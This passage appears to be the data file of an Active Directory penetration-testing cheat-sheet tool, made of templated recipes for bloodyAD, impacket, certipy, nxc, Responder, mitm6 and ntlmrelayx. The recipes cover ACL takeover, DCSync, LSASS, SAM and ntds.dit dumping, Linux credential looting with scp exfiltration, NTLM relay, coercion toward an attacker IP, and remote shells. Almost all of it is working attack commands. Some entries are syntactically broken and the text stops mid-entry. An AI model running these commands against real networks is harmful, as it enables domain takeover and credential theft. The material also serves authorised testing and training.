 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_user}}' --resolve-sd`,'bloodyAD resolve SD'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get writable --detail`,'all my write rights']
],note:'BloodHound equivalents: <span class="mono">GenericAll</span>, <span class="mono">GenericWrite</span>, <span class="mono">WriteDacl</span>, <span class="mono">WriteOwner</span>, <span class="mono">ForceChangePassword</span>, <span class="mono">AddSelf</span>, <span class="mono">AddKeyCredentialLink</span> edges.'});

R({id:'dacl-genericall-user',cat:'dacl',title:'GenericAll on user — takeover options',desc:'Full control over a user object. Pick the least destructive path that gets you in.',
cmds:[
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add shadowCredentials '{{target_user}}'`,'option A: shadow credentials'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} add shadowCredentials '{{target_user}}'`,'option A via ccache'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' msldap addspn "{{dn}}" "fake/spn"`,'option B: targeted kerberoast (then roast + delspn)'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' set password '{{target_user}}' 'Pwn3d123!'`,'option C: reset password (loud)'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add groupMember '{{group}}' '{{target_user}}'`,'option D: add to high-value group'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add genericAll '{{target_user}}' '{{user}}'`,'grant yourself (if you have WriteDacl)']
],note:'Shadow credentials (addKeyCredentialLink) is usually the cleanest: it yields a TGT + NT hash via PKINIT without touching the password.'});

R({id:'dacl-genericall-computer',cat:'dacl',title:'GenericAll / WriteAccountRestrictions on computer',desc:'Full control over a machine — shadow credentials or RBCD.',
cmds:[
 [`certipy shadow auto -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -account '{{target_host}}$'`,'shadow credentials on machine'],
 [`KRB5CCNAME={{ccache}} certipy shadow auto -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -account '{{target_host}}$'`,'shadow creds via ccache'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add shadowCredentials '{{target_host}}$'`,'bloodyAD variant'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add rbcd '{{target_host}}$' '{{computer_name}}'`,'RBCD (need rogue machine first)'],
 [`impacket-getST -spn cifs/{{target_fqdn}} -impersonate '{{target_user}}' -dc-ip {{dc_ip}} '{{domain}}/{{computer_name}}:{{computer_pass}}'`,'RBCD ticket'],
 [`nxc smb {{target_host}} -u '{{target_user}}' -H '<hash from certipy shadow>' --local-auth --sam --lsa`,'use shadow hash']
],note:'If the target is a DC: shadow credentials → hash → <span class="mono">--ntds</span>. WriteAccountRestrictions specifically is the RBCD-oriented right.'});

R({id:'dacl-genericall-group',cat:'dacl',title:'GenericAll / WriteMembers on group',desc:'Add yourself (or a controlled account) to a privileged group.',
cmds:[
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add groupMember '{{group}}' '{{user}}'`,'add self'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} add groupMember '{{group}}' '{{user}}'`,'add self via ccache'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add groupMember '{{group}}' '{{target_user}}'`,'add another account'],
 [`net rpc group addmem '{{group}}' '{{user}}' -U '{{domain}}/{{user}}%{{password}}' -S {{dc_host}}`,'net rpc variant'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' remove groupMember '{{group}}' '{{user}}'`,'CLEANUP'],
 [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --groups | grep -i '{{group}}'`,'verify membership']
],note:'Group changes apply on next logon/token refresh. For Domain Admins you may need to re-authenticate (new TGT) before the rights appear.'});

R({id:'dacl-forcechangepassword',cat:'dacl',title:'ForceChangePassword / AddSelf',desc:'Reset a password without GenericAll (ForceChangePassword) or add yourself to a group (AddSelf).',
cmds:[
 [`net rpc password '{{target_user}}' 'Pwn3d123!' -U '{{domain}}/{{user}}%{{password}}' -S {{dc_host}}`,'ForceChangePassword via net rpc'],
 [`net rpc password '{{target_user}}' 'Pwn3d123!' -U '{{domain}}/{{user}}' --use-krb5-ccache={{ccache}} -S {{dc_host}}`,'net rpc via ccache (samba)'],
 [`rpcclient -U '{{domain}}/{{user}}%{{password}}' {{dc_host}} -c 'setuserinfo2 {{target_user}} 23 Pwn3d123!'`,'rpcclient variant'],
 [`net rpc group addmem '{{group}}' '{{user}}' -U '{{domain}}/{{user}}%{{password}}' -S {{dc_host}}`,'AddSelf (you are the member)'],
 [`nxc smb {{dc_host}} -u '{{target_user}}' -p 'Pwn3d123!'`,'verify']
],note:'ForceChangePassword is the BloodHound edge name for the extended right <span class="mono">User-Force-Change-Password</span>. AddSelf only lets you add <b>yourself</b> to the group.'});

R({id:'dacl-writedacl-dcsync',cat:'dacl',title:'WriteDacl on domain → DCSync',desc:'Grant yourself replication rights and dump every hash.',
cmds:[
 [`impacket-dacledit -action write -rights DCSync -principal '{{user}}' -target-dn '{{domain_dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'write DCSync ACE'],
 [`KRB5CCNAME={{ccache}} impacket-dacledit -action write -rights DCSync -principal '{{user}}' -target-dn '{{domain_dn}}' '{{domain}}/{{user}}' -k -no-pass -dc-ip {{dc_ip}}`,'write DCSync via ccache'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add dcsync '{{user}}'`,'bloodyAD variant'],
 [`impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -just-dc`,'dump all domain hashes'],
 [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' --ntds`,'nxc variant'],
 [`impacket-dacledit -action remove -rights DCSync -principal '{{user}}' -target-dn '{{domain_dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'CLEANUP']
],note:'You need WriteDACL / GenericAll on the domain object or to be owner. The domain DN is derived from your context (<span class="mono">{{domain_dn}}</span>) — verify it in the rendered command before running.'});

R({id:'dacl-writeowner',cat:'dacl',title:'WriteOwner / ownership takeover',desc:'Take ownership first, then grant yourself WriteDACL and continue.',
cmds:[
 [`impacket-owneredit -action write -new-owner '{{user}}' -target-dn '{{dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'take ownership (impacket)'],
 [`KRB5CCNAME={{ccache}} impacket-owneredit -action write -new-owner '{{user}}' -target-dn '{{dn}}' '{{domain}}/{{user}}' -k -no-pass -dc-ip {{dc_ip}}`,'take ownership via ccache'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' set owner '{{target_user}}' '{{user}}'`,'take ownership (bloodyAD)'],
 [`impacket-dacledit -action write -rights FullControl -principal '{{user}}' -target '{{target_user}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'grant FullControl as new owner'],
 [`impacket-dacledit -action write -rights WriteMembers -principal '{{user}}' -target-dn '{{dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'or just WriteMembers (group takeover)']
],note:'Order matters: WriteOwner → owner can rewrite the DACL → grant FullControl → do anything. As owner you can always change the DACL. For groups prefer <span class="mono">-rights WriteMembers</span> to stay quiet.'});

R({id:'shadow-creds',cat:'dacl',title:'Shadow credentials (addKeyCredentialLink)',desc:'Add a Key Credential to an account, authenticate via PKINIT, get TGT + NT hash. No password change.',
cmds:[
 [`certipy shadow auto -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -account '{{target_user}}'`,'certipy (auto: add, auth, clear)'],
 [`KRB5CCNAME={{ccache}} certipy shadow auto -u '{{user}}@{{domain}}' -k -no-pass -dc-ip {{dc_ip}} -account '{{target_user}}'`,'certipy via ccache'],
 [`certipy shadow auto -u '{{user}}@{{domain}}' -hashes ':{{nthash}}' -dc-ip {{dc_ip}} -account '{{target_host}}$'`,'against a computer via PtH'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add shadowCredentials '{{target_user}}' --path .`,'bloodyAD variant (ccache/pfx output)'],
 [`certipy shadow clear -u '{{user}}@{{domain}}' -p '{{password}}' -dc-ip {{dc_ip}} -account '{{target_user}}'`,'CLEANUP: remove key credential']
],note:'Requires the DC to run Windows Server 2016+ and AD CS or a CA available for PKINIT. BloodHound edge: <span class="mono">AddKeyCredentialLink</span>. Windows equivalent: Rubeus <span class="mono">shadow /certify</span>.'});

R({id:'dacl-adminsdholder',cat:'dacl',title:'AdminSDHolder takeover → protected groups',desc:'Write an ACE on AdminSDHolder; SDProp copies it onto every protected account (Domain Admins, Enterprise Admins, ...).',
cmds:[
 [`impacket-dacledit -action write -rights FullControl -principal '{{user}}' -target-dn 'CN=AdminSDHolder,CN=System,{{domain_dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'write FullControl on AdminSDHolder'],
 [`impacket-dacledit -action read -principal '{{user}}' -target-dn 'CN=AdminSDHolder,CN=System,{{domain_dn}}' '{{domain}}/{{user}}:{{password}}' -dc-ip {{dc_ip}}`,'verify the ACE'],
 [`# SDProp runs every 60 min by default — from Windows: Invoke-SDPropagator -timeoutMinutes 1`,'wait or trigger SDProp','n'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{group}}' --resolve-sd`,'check your rights on a protected group'],
 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' add groupMember '{{group}}' '{{user}}'`,'add yourself after SDProp ran']
],note:'3rd-order persistence: SDProp re-applies the ACE, so cleanup requires removing the AdminSDHolder ACE first. Protected objects have <span class="mono">adminCount=1</span> and inheritance disabled. From Linux you cannot force SDProp reliably — wait for the hourly run or use a Windows session (PowerView).'});

/* ===== CREDS & SECRETS ===== */
R({id:'creds-dcsync',cat:'creds',title:'DCSync — dump domain secrets',desc:'Replicate secrets like a DC (needs DCSync rights / DA). The endgame on most boxes.',
cmds:[
 [`impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -just-dc -outputfile {{hashfile}}`,'all hashes (password)'],
 [`impacket-secretsdump '{{domain}}/{{user}}' -hashes ':{{nthash}}' -just-dc-ntlm -dc-ip {{dc_ip}}`,'NT hashes only (PtH)'],
 [`impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -just-dc-user '{{target_user}}'`,'single account'],
 [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' --ntds`,'nxc NTDS dump'],
 [`KRB5CCNAME={{ccache}} nxc smb {{dc_host}} -u '{{user}}' -k --use-kcache --ntds`,'nxc via ccache'],
 [`export KRB5CCNAME={{ccache}} && impacket-secretsdump -k -no-pass {{dc_fqdn}} -just-dc`,'impacket via ccache']
],note:'<span class="mono">-just-dc-user krbtgt</span> for the golden-ticket key, <span class="mono">-just-dc-user {{netbios}}$</span> for trust keys. Output format: <span class="mono">user:rid:LM:NT:::</span> — NT hash for PtH.'});

R({id:'creds-sam-lsa',cat:'creds',title:'Dump SAM / LSA (admin on a host)',desc:'Local accounts and LSA secrets from any machine where you are local admin.',
cmds:[
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --sam --lsa`,'domain account with local admin'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --local-auth --sam --lsa`,'local auth'],
 [`nxc smb {{target_host}} -u '{{user}}' -H '{{nthash}}' --sam --lsa`,'via PtH'],
 [`impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'impacket full dump'],
 [`KRB5CCNAME={{ccache}} nxc smb {{target_host}} -u '{{user}}' -k --use-kcache --sam --lsa`,'nxc via ccache'],
 [`KRB5CCNAME={{ccache}} impacket-secretsdump -k -no-pass '{{domain}}/{{user}}@{{target_fqdn}}'`,'impacket via ccache'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M lsassy`,'LSASS dump (all logon creds)'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M nanodump`,'nanodump alternative']
],note:'LSA secrets may contain service account passwords and cached domain creds. LSASS can hold plaintext creds for logged-on users — check for other sessions first.'});

R({id:'creds-dpapi',cat:'creds',title:'DPAPI — browser / Windows credential blobs',desc:'Dump and decrypt DPAPI-protected secrets (Chrome/Edge/Outlook/Firefox).',
cmds:[
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --dpapi`,'credentials + masterkeys'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --dpapi cookies`,'browser cookies'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --dpapi --local-auth`,'local accounts'],

R({id:'creds-gmsa',cat:'creds',title:'gMSA / LAPS passwords',desc:'Group Managed Service Account password reads and LAPS local admin passwords.',
cmds:[
 [`nxc ldap {{dc_host}} -u '{{user}}' -p '{{password}}' --gmsa`,'read readable gMSAs'],

 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -k ccache={{ccache}} get object '{{target_host}}$' --attr ms-Mcs-AdmPwd`,'LAPS via ccache'],

 [`bloodyAD --host {{dc_host}} -d {{domain}} -u '{{user}}' -p '{{password}}' get object '{{target_host}}$' --attr msLAPS-Password,ms-Mcs-AdmPwd`,'legacy + Windows LAPS v2 password'],
 [`nxc smb {{target_host}} -u '{{target_user}}' -p '<LAPS password>' --local-auth`,'use the LAPS password']

R({id:'creds-ntds-offline',cat:'creds',title:'Offline ntds.dit / SAM extraction',desc:'Got the files (backup, shadow copy, loot)? Parse them locally.',
cmds:[
 [`impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL`,'parse local hives'],
 [`impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL`,'parse ntds.dit'],

 [`hashcat -m 1000 {{hashfile}} {{wordlist}}`,'crack dumped NTLM hashes','n']
],note:'Grab files on a Windows target with <span class="mono">vssadmin create shadow</span>, <span class="mono">diskshadow</span>, or <span class="mono">ntdsutil</span> + <span class="mono">robocopy</span>. nxc <span class="mono">--ntds vss</span> does the shadow-copy route for you.'});

R({id:'linux-loot',cat:'creds',title:'Linux loot — ccache, keytab & configs',desc:'After a Linux foothold: hunt Kerberos material, credentials and useful configs before extracting anything.',
cmds:[
 [`find / -xdev \\( -name '*.ccache' -o -name '*.keytab' -o -name 'krb5cc_*' \\) 2>/dev/null`,'hunt tickets + keytabs','n'],
 [`ls -la /tmp/ /var/tmp/ 2>/dev/null | grep -i krb`,'default ccache locations','n'],
 [`grep -rniE 'pass=|password|secret|token' /etc /opt /srv /home 2>/dev/null | head -50`,'grep for credentials','n'],
 [`cat ~/.bash_history /home/*/.bash_history 2>/dev/null | tail -50`,'shell history','n'],
 [`sudo -l`,'what can we sudo?','n'],
 [`crontab -l; ls -la /etc/cron* 2>/dev/null`,'cron jobs','n'],
 [`tar czf /tmp/loot.tgz /etc/krb5.keytab /tmp/*.ccache 2>/dev/null`,'package Kerberos material','n'],
 [`export KRB5CCNAME=/path/to/stolen.ccache && klist`,'use a stolen ccache','n'],
 [`find / -xdev -readable \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' \\) 2>/dev/null`,'hunt SSH keys','n'],
 [`ssh -i id_rsa -o StrictHostKeyChecking=no user@target`,'reuse found keys for lateral movement'],
 [`scp user@target:/tmp/loot.tgz .`,'pull the loot to Kali']
],note:'<span class="mono">/etc/krb5.keytab</span> → use the KeyTabExtract recipe (machine account AES/NTLM). Stolen <span class="mono">.ccache</span> files work directly via KRB5CCNAME. Also check service configs for DB/app passwords and <span class="mono">id_rsa</span> keys in home directories.'});

R({id:'win-registry-loot',cat:'creds',title:'Windows loot — registry, autologon, saved creds',desc:'Classic credential locations on Windows hosts after you land on one.',
cmds:[
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"'`,'AutoLogon credentials'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'reg query "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"'`,'Run keys (persistence/malware)'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'cmdkey /list'`,'saved credentials'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'dir /s /b C:\\unattend.xml C:\\Windows\\Panther\\unattend.xml C:\\sysprep.inf'`,'unattend/sysprep files'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M spider_plus`,'spider shares for configs/scripts'],
 [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -M gpp_password`,'GPP cpassword in SYSVOL'],
 [`runas /savecred /user:{{domain}}\\{{target_user}} cmd.exe`,'use saved creds (target-side)','n']
],note:'<span class="mono">cmdkey /list</span> + <span class="mono">runas /savecred</span> is a classic combo. AutoLogon stores <span class="mono">DefaultPassword</span> in cleartext. Also check backup scripts, <span class="mono">web.config</span>, <span class="mono">*.ps1</span> on shares (spider_plus loot).'});

R({id:'sebackup',cat:'creds',title:'SeBackupPrivilege — copy hives and ntds.dit',desc:'Backup Operators (or an enabled SeBackupPrivilege) can read any file — dump SAM/SYSTEM/SECURITY and even ntds.dit.',
cmds:[
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hive && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive && reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.hive'`,'save the hives'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --get-file 'C:\\Windows\\Temp\\sam.hive' /tmp/sam.hive`,'pull SAM'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --get-file 'C:\\Windows\\Temp\\system.hive' /tmp/system.hive`,'pull SYSTEM'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --get-file 'C:\\Windows\\Temp\\security.hive' /tmp/security.hive`,'pull SECURITY'],
 [`impacket-secretsdump -sam /tmp/sam.hive -system /tmp/system.hive -security /tmp/security.hive LOCAL`,'parse the hives offline'],
 [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' -x 'robocopy /b C:\\Windows\\NTDS C:\\Windows\\Temp ntds.dit && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.hive'`,'DC: copy ntds.dit with backup semantics'],
 [`nxc smb {{dc_host}} -u '{{user}}' -p '{{password}}' --get-file 'C:\\Windows\\Temp\\ntds.dit' /tmp/ntds.dit`,'pull ntds.dit'],
 [`impacket-secretsdump -ntds /tmp/ntds.dit -system /tmp/system.hive LOCAL`,'all domain hashes offline']
],note:'<span class="mono">reg save</span> already works for normal admins; SeBackup matters for Backup Operators without full admin. The ntds.dit copy usually needs <span class="mono">robocopy /b</span> (backup semantics) or a VSS snapshot via <span class="mono">diskshadow</span> because the file is locked — see the offline-ntds recipe. Remove the hives from C:\\Windows\\Temp afterwards.'});

/* ===== POISONING & RELAY ===== */
R({id:'relay-responder',cat:'relay',title:'Responder — LLMNR/NBT-NS/mDNS poisoning',desc:'Catch NTLM hashes on the wire when DNS fails. First move with no creds.',
cmds:[
 [`sudo responder -I {{iface}} -A`,'analysis mode (see traffic first)','ns'],
 [`sudo responder -I {{iface}} -wdv`,'poison WPAD + DNS + verbose','ns'],
 [`sudo responder -I {{iface}} -wPv`,'proxy auth to ntlmrelayx (for relaying)','ns'],
 [`hashcat -m 5600 /usr/share/responder/logs/NTLMv2-*.txt {{wordlist}}`,'crack captured NetNTLMv2','n'],
 [`john --format=netntlmv2 --wordlist={{wordlist}} /usr/share/responder/logs/NTLMv2-*.txt`,'john alternative','n']
],note:'Responder alone only captures hashes for cracking. To relay instead, disable its SMB/HTTP servers: <span class="mono">sudo responder -I {{iface}} -wPv</span> pairs with ntlmrelayx. NTLMv1 can be downgraded for faster cracking.'});

R({id:'relay-smb',cat:'relay',title:'ntlmrelayx — relay to SMB',desc:'Forward captured NTLM auth to hosts where SMB signing is not required.',
cmds:[
 [`nxc smb {{target_ip}} --gen-relay-list relay-targets.txt`,'list hosts without SMB signing'],
 [`impacket-ntlmrelayx -tf relay-targets.txt -smb2support -l /tmp/relay-loot`,'relay list, loot to disk','n'],
 [`impacket-ntlmrelayx -t smb://{{target_ip}} -smb2support`,'relay single target','n'],
 [`impacket-ntlmrelayx -tf relay-targets.txt -smb2support -c 'whoami /all'`,'relay + run command','n'],
 [`impacket-ntlmrelayx -t smb://{{target_ip}} -smb2support --no-smb-server`,'no smb server (cleaner)','n']
],note:'Relayed auth uses the victim computer account → if it is a local admin target side, ntlmrelayx dumps SAM automatically. Find signing-less hosts with <span class="mono">--gen-relay-list</span> (nxc) before poisoning.'});

R({id:'relay-ldap',cat:'relay',title:'ntlmrelayx — relay to LDAP(S)',desc:'Relay to a DC without LDAP signing → grant a controlled account DCSync rights.',
cmds:[
 [`impacket-ntlmrelayx -t ldap://{{dc_host}} -smb2support`,'probe LDAP relay','n'],
 [`impacket-ntlmrelayx -t ldaps://{{dc_host}} --escalate-user '{{user}}' -smb2support`,'escalate user to DCSync','n'],
 [`impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -just-dc`,'use the granted rights'],
 [`impacket-ntlmrelayx -t ldaps://{{dc_host}} --add-computer '{{computer_name}}' '{{computer_pass}}' -smb2support`,'add a machine account','n'],
 [`impacket-ntlmrelayx -t ldaps://{{dc_host}} -i --no-smb-server`,'interactive LDAP shell on the relayed session','n'],
 [`impacket-ntlmrelayx -t ldaps://{{dc_host}} --dump-laps --dump-gmsa -smb2support`,'dump readable LAPS/gMSA passwords','n']
],note:'LDAPS relay works even with channel binding unless EPA is enforced; LDAP relay needs signing not required. Coerce a DC/service with PetitPotam/PrinterBug to trigger the auth first.'});

R({id:'relay-rbcd',cat:'relay',title:'ntlmrelayx — RBCD via relay',desc:'No write rights? Let the relay create the machine and set delegation for you.',
cmds:[
 [`impacket-ntlmrelayx -t ldaps://{{dc_host}} --delegate-access -smb2support`,'create machine + RBCD','n'],
 [`impacket-ntlmrelayx -t ldaps://{{dc_host}} --delegate-access --escalate-user '{{user}}' -smb2support`,'also escalate user','n'],
 [`impacket-getST -spn cifs/{{target_fqdn}} -impersonate '{{target_user}}' -dc-ip {{dc_ip}} '{{domain}}/<RANDOM$>:<PASSWORD>'`,'use printed machine creds'],
 [`KRB5CCNAME={{ccache}} nxc smb {{target_host}} -u '{{target_user}}' -k --use-kcache --sam`,'dump with the ticket']
],note:'ntlmrelayx prints the generated machine account name and password (<span class="mono">Adding computer account ... / Password ...</span>). The relayed account must have write access over the RBCD target (often the DC itself). Cleanup: <span class="mono">impacket-rbcd -action flush</span> + delete computer.'});

R({id:'relay-socks',cat:'relay',title:'ntlmrelayx — SOCKS mode',desc:'Relay many sessions at once and interact through individual authenticated sockets.',
cmds:[
 [`impacket-ntlmrelayx -tf targets.txt -smb2support -socks -l /tmp/relay-loot`,'start SOCKS proxy','n'],
 [`impacket-ntlmrelayx -tf targets.txt -smb2support -socks -socks-port 1080`,'custom socks port','n'],
 [`proxychains4 -f /etc/proxychains4.conf impacket-secretsdump -no-pass '{{domain}}/user@target'`,'use a session through the proxy'],
 [`# in ntlmrelayx console: socks — list sessions, stop <session-id>`,'manage sessions','n']
],note:'Each relayed identity gets its own SOCKS port. Configure proxychains to point at the socks port (<span class="mono">socks5 127.0.0.1 1080</span>) and interact with any service as that user.'});

R({id:'relay-coerce',cat:'relay',title:'Coercion — make targets authenticate to you',desc:'Force machine accounts (especially DCs) to authenticate to your relay or unconstrained host.',
cmds:[
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -M coerce_plus -o LISTENER={{attacker_ip}}`,'nxc coercion module'],
 [`coercer -u '{{user}}' -p '{{password}}' -d {{domain}} --target {{target_host}}`,'all vectors, list only'],
 [`coercer -u '{{user}}' -p '{{password}}' -d {{domain}} --target {{target_host}} -l {{attacker_ip}}`,'fire all vectors'],
 [`impacket-printerbug '{{domain}}/{{user}}:{{password}}@{{target_host}}' {{attacker_ip}}`,'spooler (MS-RPRN)'],
 [`impacket-petitpotam '{{domain}}/{{user}}:{{password}}@{{target_host}}' {{attacker_ip}}`,'EFSRPC'],
 [`impacket-dfscoerce '{{domain}}/{{user}}:{{password}}@{{target_host}}' '{{domain}}/{{dc_host}}'`,'DFS coerce']
],note:'Combine with Responder/ntlmrelayx (<span class="mono">-M coerce_plus -o LISTENER={{attacker_ip}}</span> triggers and relays) or with an unconstrained-delegation host you own. Cheapest auth coercion on modern boxes is usually PetitPotam or DFSCoerce.'});

R({id:'mitm6',cat:'relay',title:'mitm6 — IPv6 DNS takeover + relay',desc:'When LLMNR/NBT-NS are quiet: take over DNS via DHCPv6 and relay the authentication that follows.',
cmds:[
 [`sudo mitm6 -d {{domain}} -i {{iface}}`,'answer DHCPv6 and spoof DNS (attacker)','ns'],
 [`impacket-ntlmrelayx -6 -wh {{attacker_ip}} -t ldaps://{{dc_host}} --escalate-user '{{user}}' -smb2support`,'relay to LDAPS and grant DCSync','n'],
 [`impacket-ntlmrelayx -6 -wh {{attacker_ip}} -t ldaps://{{dc_host}} --delegate-access -smb2support`,'RBCD via relay instead','n'],
 [`impacket-ntlmrelayx -6 -wh {{attacker_ip}} -tf targets.txt -socks -smb2support`,'collect sessions for proxychains','n'],
 [`impacket-secretsdump '{{domain}}/{{user}}:{{password}}@{{dc_host}}' -just-dc`,'use the escalated rights after a successful relay']
],note:'mitm6 becomes the IPv6 DNS server and answers WPAD lookups, so clients authenticate to your host; ntlmrelayx forwards that to LDAP(S). Works best with <span class="mono">-wh</span> pointing at the attacker IP. Mitigations that kill it: disable IPv6, enforce LDAP signing/channel binding, block WPAD.'});

/* ===== LATERAL MOVEMENT ===== */
R({id:'lat-winrm',cat:'lateral',title:'WinRM — remote shell',desc:'5985/5986 shell with creds, hash or Kerberos ticket. Your favorite nxc first.',
cmds:[
 [`nxc winrm {{target_host}} -u '{{user}}' -p '{{password}}' -x whoami`,'nxc command exec'],
 [`nxc winrm {{target_host}} -u '{{user}}' -p '{{password}}' -X 'Get-Process | Select-Object -First 5'`,'PowerShell exec'],
 [`nxc winrm {{target_host}} -u '{{user}}' -H '{{nthash}}'`,'PtH + interactive prompt'],
 [`KRB5CCNAME={{ccache}} nxc winrm {{target_host}} -u '{{user}}' -k --use-kcache -x whoami`,'Kerberos ccache'],
 [`evil-winrm -i {{target_host}} -u '{{user}}' -p '{{password}}'`,'interactive shell'],
 [`evil-winrm -i {{target_host}} -u '{{user}}' -H '{{nthash}}'`,'interactive PtH shell']
],note:'evil-winrm extras: <span class="mono">-s</span> scripts dir, <span class="mono">-e</span> exes dir, <span class="mono">upload</span>/<span class="mono">download</span> commands, <span class="mono">menu</span> for AMSI bypass.'});

R({id:'lat-smb-exec',cat:'lateral',title:'SMB exec via nxc',desc:'Run commands on hosts where you are local admin, no interactive shell needed.',
cmds:[
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -x 'whoami'`,'cmd exec'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' -X 'whoami /priv'`,'PowerShell exec'],
 [`nxc smb {{target_host}} -u '{{user}}' -H '{{nthash}}' -x 'whoami'`,'PtH exec'],
 [`KRB5CCNAME={{ccache}} nxc smb {{target_host}} -u '{{user}}' -k --use-kcache -x 'whoami'`,'ccache exec'],
 [`nxc smb {{target_host}} -u '{{user}}' -p '{{password}}' --local-auth -x 'whoami'`,'local account exec']
],note:'<span class="mono">-x</span> uses cmd, <span class="mono">-X</span> uses PowerShell. Great for one-liners like adding an admin user or starting a reverse shell.'});

R({id:'lat-impacket-exec',cat:'lateral',title:'Impacket exec family (psexec/smbexec/wmiexec/atexec)',desc:'Drop-in alternatives when nxc is blocked or you want a different service binary / technique.',
cmds:[
 [`impacket-psexec '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'psexec (service, loud)'],
 [`impacket-psexec -hashes ':{{nthash}}' '{{domain}}/{{user}}@{{target_host}}'`,'psexec PtH'],
 [`impacket-smbexec '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'smbexec (semi-interactive)'],
 [`impacket-wmiexec '{{domain}}/{{user}}:{{password}}@{{target_host}}'`,'wmiexec (quiet)'],
 [`impacket-atexec '{{domain}}/{{user}}:{{password}}@{{target_host}}' 'whoami'`,'atexec (scheduled task)'],
 [`KRB5CCNAME={{ccache}} impacket-psexec -k -no-pass '{{domain}}/{{user}}@{{target_host}}'`,'Kerberos via ccache'],
 [`KRB5CCNAME={{ccache}} impacket-wmiexec -k -no-pass '{{domain}}/{{user}}@{{target_fqdn}}'`,'wmiexec via ccache'],
 [`KRB5CCNAME={{ccache}} impacket-smbexec -k -no-pass '{{domain}}/{{user}}@{{target_fqdn}}'`,'smbexec via ccache']
],note:'WMI is usually the quietest. Psexec writes a service binary to ADMIN$ — AV/EDR food and leaves artifacts. All of them need local admin/SMB write access.'});

R({id:'lat-rdp',cat:'lateral',title:'Enable RDP / disable firewall / connect',desc:'Get an RDP session when port 3389 is closed or firewall blocks it.',
cmds:[
